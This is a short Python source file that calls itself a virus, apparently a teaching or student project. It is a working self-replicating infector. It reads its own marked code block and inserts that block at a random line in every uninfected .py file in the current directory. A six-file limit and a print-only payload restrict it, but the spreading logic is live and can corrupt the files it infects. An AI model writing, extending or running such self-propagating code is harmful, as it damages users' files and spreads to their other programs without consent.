#pyhon virus
#print('Hello World')

###  VIRUS BEGIN ###
import sys, glob, re, random

#Get a copy of the virus
vCode = []
fh = open(sys.argv[0], "r")
lines = fh.readlines()
fh.close()
inVirus = False
for line in lines:
    if re.search('^###  VIRUS BEGIN ###', line): inVirus = True  #^.. matches a string that starts with ..
    if inVirus: vCode.append(line)
    if re.search('^### VIRUS END ###', line): break

#Find potential Victims
progs = glob.glob("*.py")

#Check and Infect
if len(progs)<6:        ##security limit##
    for prog in progs:
        fh = open(prog,"r")
        pCode = fh.readlines()
        fh.close()
        infected = False
        for line in pCode:
            if ('###  VIRUS BEGIN ###' in line):
                infected = True
                break
        if not infected:
            newCode = []
            #locaton to append virus
            loc=random.randint(0,len(pCode)-1)
            #append virus
            newCode.extend(pCode[:loc])
            newCode.extend(vCode)
            newCode.extend(pCode[loc:])
            #Writing new virus infected code
            fh = open(prog, 'w')
            fh.writelines(newCode)
            fh.close()
            
    print("Infected")
    
else: print('!!security limit reached!! \nVirus became extremely dangerous')

#Virus Action (This is the main virus purpose but not the purpose of this project so we choose a simple print)
print('OOOPPSS..!')


### VIRUS END ###
